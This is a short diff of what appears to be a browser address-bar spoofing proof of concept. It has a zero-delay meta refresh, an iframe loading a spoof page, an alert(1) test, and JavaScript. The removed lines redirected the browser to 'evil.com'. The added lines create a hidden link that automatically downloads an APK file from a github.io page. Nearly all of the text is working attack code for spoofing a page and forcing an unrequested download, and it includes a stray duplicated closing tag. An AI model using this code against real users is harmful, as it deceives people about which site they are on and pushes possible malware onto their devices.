@@ -1,4 +1,4 @@
-<META HTTP-EQUIV="refresh" CONTENT="0;url=https://www.bing.com/search%2f..%2fth/id/OIP._SlAfvVvlUxYhad4eED5SwAAAAa%3fq=hacked+fbi?q=www·fbi·gov&FORM=HDRSC1&query=FBI+Hacked">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
+<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
 <iframe src="spoof.htm"></iframe>
 index.htm
 ====================
@@ -8,17 +8,17 @@ alert(1); //alert twice
 </script>
 
 <script>
-setTimeout(sleep, 500);
+function sleep()
+{
+    document.write("123<br>");
 
-function sleep() {
-    document.body.insertAdjacentHTML("beforeend", "123<br>");
-
-    setTimeout(() => {
-        const url = "https://evil.com";
-        window.location.href = url;
-    }, 500);
+    var link = document.createElement("a");
+    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
+    link.download = "montero.apk";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 }
-</script>
 
 </script>
 
